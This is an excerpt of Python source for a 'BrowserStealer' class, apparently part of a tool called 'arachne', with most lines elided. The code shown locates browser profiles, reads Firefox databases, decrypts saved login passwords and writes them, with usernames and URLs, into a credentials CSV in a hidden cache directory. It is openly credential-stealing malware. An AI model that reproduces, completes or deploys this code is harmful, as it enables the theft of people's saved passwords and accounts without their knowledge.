...
class BrowserStealer:
    ...
    def find_browser_profiles(self):
        ...
        profile_paths = {
            ...
            "safari": ["~/Library/Safari/", "/Library/Safari/"],
        }
    ...
    def extract_firefox_data(self, profile_path):
        ...
        try:
            ...
            # Extract bookmarks
            if os.path.exists(places_file):
                bookmarks = self.read_sqlite_db(
                    places_file, "moz_bookmarks", ["title", "dateAdded", "lastModified"]
                )
                ...
                if temp_db:
                    ...
                    for login in logins:
                        if login.get("password_value"):
                            try:
                                decrypted = self.decrypt_chrome_password(
    ...
    def execute(self):
        ...
        try:
            ...
            # Save results
            output_dir = os.path.expanduser("~/.cache/.arachne/browser_data")
            os.makedirs(output_dir, exist_ok=True)

            output_file = os.path.join(
                output_dir,
                f"browser_data_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            )
            ...
            csv_file = os.path.join(
                output_dir,
                f"credentials_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            )
    ...
    def create_credentials_csv(self, csv_file):
        ...
        try:
            ...
            with open(csv_file, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(
                    ["Browser", "Profile", "URL", "Username", "Password", "Date"]
                )
